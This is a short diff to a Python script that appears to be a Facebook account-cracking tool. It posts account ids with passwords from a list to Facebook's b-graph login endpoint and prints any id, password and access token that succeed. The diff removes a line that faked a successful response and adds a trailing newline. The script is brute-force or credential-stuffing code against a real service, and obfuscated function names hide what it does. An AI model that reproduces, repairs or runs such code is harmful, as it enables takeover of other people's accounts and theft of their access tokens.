@@ -5780,9 +5780,6 @@ def _____method_____(ids, passlist):
             url = "https://b-graph.facebook.com/auth/login"
             response = requests.post(url, data=data, headers=head,
                                      verify=True).json()
-
-            response = "access_token"
-            
             print(ids)
             if "access_token" in response:
                 print(f"{ids}|{pas}|{response}")
@@ -5805,3 +5802,4 @@ def _____method_____(ids, passlist):
 #---------------------[ IMPORT ]---------------------#
 if __name__ == "__main__":
     ____main_____()
+
